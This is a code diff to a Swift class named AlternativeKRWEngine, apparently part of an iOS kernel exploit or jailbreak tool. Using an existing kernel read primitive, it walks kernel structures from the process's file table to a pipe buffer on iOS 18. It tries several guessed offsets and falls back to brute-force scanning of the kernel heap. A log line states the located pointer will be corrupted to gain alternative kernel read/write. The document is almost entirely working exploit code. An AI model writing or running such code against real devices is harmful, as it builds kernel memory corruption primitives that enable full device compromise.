@@ -195,75 +195,145 @@ class AlternativeKRWEngine: ObservableObject {
             }
             
             // proc → p_fd → fd_ofiles → fileproc → fg_data → pipe → pipe_buffer
-            let p_fd = ds_kread64(ourProc + 0xf8) // p_fd offset (varies by iOS version)
-            self.log(String(format: "p_fd: 0x%llx", p_fd))
+            // Use the correct offset from offsets.h
+            let p_fd = ds_kread64(ourProc + UInt64(off_proc_p_fd))
+            self.log(String(format: "p_fd (proc+0x%x): 0x%llx", off_proc_p_fd, p_fd))
             
             guard p_fd != 0 else {
                 self.log("❌ p_fd is NULL — offset may be wrong")
+                self.log("   Trying scan approach...")
+                self.scanForPipeBuffer(proc: ourProc, pipeFD: self.pipeReadFD, marker: marker)
                 DispatchQueue.main.async { self.isWorking = false }
                 return
             }
             
-            // fd_ofiles is array of fileproc pointers
-            let fd_ofiles = ds_kread64(p_fd + 0x0) // filedesc.fd_ofiles
-            self.log(String(format: "fd_ofiles: 0x%llx", fd_ofiles))
+            // iOS 18: filedesc structure
+            // filedesc.fd_ofiles is at offset 0x0 (array of fp_glob pointers)
+            // But on iOS 18.2, it may be fd_ofiles at offset 0x20 or use fdt_ofiles
+            let fd_ofiles = ds_kread64(p_fd + 0x0) // try offset 0
+            self.log(String(format: "fd_ofiles (p_fd+0x0): 0x%llx", fd_ofiles))
             
-            guard fd_ofiles != 0 else {
-                self.log("❌ fd_ofiles is NULL")
-                DispatchQueue.main.async { self.isWorking = false }
-                return
-            }
-            
-            // Read fileproc for our pipe fd
-            let fpAddr = ds_kread64(fd_ofiles + UInt64(self.pipeReadFD) * 8)
-            self.log(String(format: "fileproc[%d]: 0x%llx", self.pipeReadFD, fpAddr))
-            
-            guard fpAddr != 0 else {
-                self.log("❌ fileproc is NULL — fd table layout different on iOS 18?")
-                self.log("   Trying alternative: scan proc open files...")
-                self.tryAlternativePipeScan()
-                DispatchQueue.main.async { self.isWorking = false }
-                return
-            }
-            
-            // fileproc → fp_glob → fg_data (pipe struct)
-            let fp_glob = ds_kread64(fpAddr + 0x10) // fp_glob offset
-            let fg_data = ds_kread64(fp_glob + 0x38) // fg_data offset
-            self.log(String(format: "pipe struct: 0x%llx", fg_data))
-            
-            guard fg_data != 0 else {
-                self.log("❌ pipe struct is NULL")
-                DispatchQueue.main.async { self.isWorking = false }
-                return
-            }
-            
-            // pipe → pipe_buffer.buffer (the actual data pointer)
-            // On iOS 18: struct pipe { pipe_buffer pipe_buffer; ... }
-            // pipe_buffer.buffer is at offset 0x10 in pipe struct
-            let pipeBuffer = ds_kread64(fg_data + 0x10)
-            self.log(String(format: "pipe_buffer.buffer: 0x%llx", pipeBuffer))
-            
-            if pipeBuffer != 0 {
-                // Verify by reading the marker we wrote
-                let readMarker = ds_kread64(pipeBuffer)
-                self.log(String(format: "Marker read: 0x%llx (expected 0x%llx)", readMarker, marker))
-                
-                if readMarker == marker {
-                    self.pipeBufferKaddr = pipeBuffer
-                    self.log("✅ Pipe buffer found and verified!")
-                    self.log("   We can now corrupt this pointer for alternative KRW")
-                    DispatchQueue.main.async { self.pipeKRWReady = true }
-                    self.recordResult(primitive: "Pipe Buffer", action: "setup", addr: pipeBuffer, val: marker, success: true, msg: "Buffer located")
-                } else {
-                    self.log("⚠️ Marker mismatch — offset may be wrong")
-                    self.log("   Scanning nearby offsets...")
-                    self.scanPipeBufferOffsets(pipeStruct: fg_data, expectedMarker: marker)
+            if fd_ofiles == 0 || !ds_isvalid(fd_ofiles) {
+                // Try alternative offsets for iOS 18
+                self.log("   fd_ofiles at +0x0 invalid, trying alternatives...")
+                let altOffsets: [UInt64] = [0x20, 0x28, 0x30, 0x8, 0x10, 0x18]
+                var foundOfiles: UInt64 = 0
+                for off in altOffsets {
+                    let candidate = ds_kread64(p_fd + off)
+                    if candidate != 0 && ds_isvalid(candidate) {
+                        // Verify: read entry at our pipe FD index
+                        let entry = ds_kread64(candidate + UInt64(self.pipeReadFD) * 8)
+                        if entry != 0 && ds_isvalid(entry) {
+                            self.log(String(format: "   Found fd_ofiles at p_fd+0x%llx = 0x%llx", off, candidate))
+                            foundOfiles = candidate
+                            break
+                        }
+                    }
                 }
-            } else {
-                self.log("❌ pipe_buffer.buffer is NULL — pipe may use inline buffer")
+                
+                if foundOfiles == 0 {
+                    self.log("❌ Cannot find fd_ofiles — trying direct scan")
+                    self.scanForPipeBuffer(proc: ourProc, pipeFD: self.pipeReadFD, marker: marker)
+                    DispatchQueue.main.async { self.isWorking = false }
+                    return
+                }
+                
+                self.findPipeFromOfiles(ofiles: foundOfiles, pipeFD: self.pipeReadFD, marker: marker)
+                DispatchQueue.main.async { self.isWorking = false }
+                return
             }
             
+            self.findPipeFromOfiles(ofiles: fd_ofiles, pipeFD: self.pipeReadFD, marker: marker)
             DispatchQueue.main.async { self.isWorking = false }
+        }
+    }
+    
+    /// Follow fd_ofiles → fileproc → fg_data → pipe → buffer
+    private func findPipeFromOfiles(ofiles: UInt64, pipeFD: Int32, marker: UInt64) {
+        // Read fileproc for our pipe fd
+        let fpAddr = ds_kread64(ofiles + UInt64(pipeFD) * 8)
+        log(String(format: "fileproc[%d]: 0x%llx", pipeFD, fpAddr))
+        
+        guard fpAddr != 0 && ds_isvalid(fpAddr) else {
+            log("❌ fileproc is NULL")
+            scanForPipeBuffer(proc: ds_get_our_proc(), pipeFD: pipeFD, marker: marker)
+            return
+        }
+        
+        // iOS 18: fileproc → fp_glob (offset varies: 0x8, 0x10, 0x18)
+        // fp_glob → fg_data (offset varies: 0x28, 0x30, 0x38)
+        let fpOffsets: [UInt64] = [0x10, 0x8, 0x18, 0x20]
+        
+        for fpOff in fpOffsets {
+            let fp_glob = ds_kread64(fpAddr + fpOff)
+            guard fp_glob != 0 && ds_isvalid(fp_glob) else { continue }
+            
+            let fgOffsets: [UInt64] = [0x38, 0x28, 0x30, 0x40, 0x48]
+            for fgOff in fgOffsets {
+                let fg_data = ds_kread64(fp_glob + fgOff)
+                guard fg_data != 0 && ds_isvalid(fg_data) else { continue }
+                
+                // fg_data is the pipe struct — scan it for our marker
+                log(String(format: "  Trying fp_glob(+0x%llx)=0x%llx → fg_data(+0x%llx)=0x%llx", fpOff, fp_glob, fgOff, fg_data))
+                
+                // Scan pipe struct for buffer pointer containing our marker
+                for pipeOff in stride(from: 0, through: 0x100, by: 8) {
+                    let ptr = ds_kread64(fg_data + UInt64(pipeOff))
+                    if ptr != 0 && ds_isvalid(ptr) {
+                        let val = ds_kread64_safe(ptr)
+                        if val == marker {
+                            log(String(format: "✅ FOUND pipe buffer at pipe+0x%x → 0x%llx (marker verified!)", pipeOff, ptr))
+                            log(String(format: "   Path: fileproc+0x%llx → fp_glob+0x%llx → pipe+0x%x → buffer", fpOff, fgOff, pipeOff))
+                            pipeBufferKaddr = ptr
+                            DispatchQueue.main.async { self.pipeKRWReady = true }
+                            recordResult(primitive: "Pipe Buffer", action: "setup", addr: ptr, val: marker, success: true, msg: "Buffer located via fd table walk")
+                            return
+                        }
+                    }
+                }
+            }
+        }
+        
+        log("❌ Could not find pipe buffer via fd table walk")
+        log("   Pipe buffer may use inline storage on iOS 18")
+    }
+    
+    /// Brute-force scan: search kernel heap near our proc for the pipe marker
+    private func scanForPipeBuffer(proc: UInt64, pipeFD: Int32, marker: UInt64) {
+        log("Scanning kernel heap for pipe marker 0x\(String(format: "%llx", marker))...")
+        log("   This scans nearby heap allocations (safe, read-only)")
+        
+        // Strategy: pipe buffers are allocated near other objects from our process
+        // Scan a range around our proc address
+        let scanBase = proc & 0xFFFFFFFFFFFF0000 // align to 64KB page
+        let scanSize: UInt64 = 0x40000 // 256KB range
+        
+        var found = false
+        for offset in stride(from: UInt64(0), to: scanSize, by: 0x1000) {
+            let pageBase = scanBase + offset
+            // Read first 8 bytes of each page to check if accessible
+            let firstVal = ds_kread64_safe(pageBase)
+            if firstVal == 0 { continue } // skip empty/inaccessible pages
+            
+            // Scan this page for our marker
+            for innerOff in stride(from: UInt64(0), to: 0x1000, by: 8) {
+                let addr = pageBase + innerOff
+                let val = ds_kread64_safe(addr)
+                if val == marker {
+                    log(String(format: "✅ FOUND marker at 0x%llx (heap scan)", addr))
+                    pipeBufferKaddr = addr
+                    DispatchQueue.main.async { self.pipeKRWReady = true }
+                    recordResult(primitive: "Pipe Buffer", action: "heap_scan", addr: addr, val: marker, success: true, msg: "Found via heap scan")
+                    found = true
+                    return
+                }
+            }
+        }
+        
+        if !found {
+            log("❌ Marker not found in 256KB scan range")
+            log("   Pipe buffer may be in a different zone/region")
+            recordResult(primitive: "Pipe Buffer", action: "heap_scan", addr: scanBase, val: 0, success: false, msg: "Marker not found in scan range")
         }
     }
     
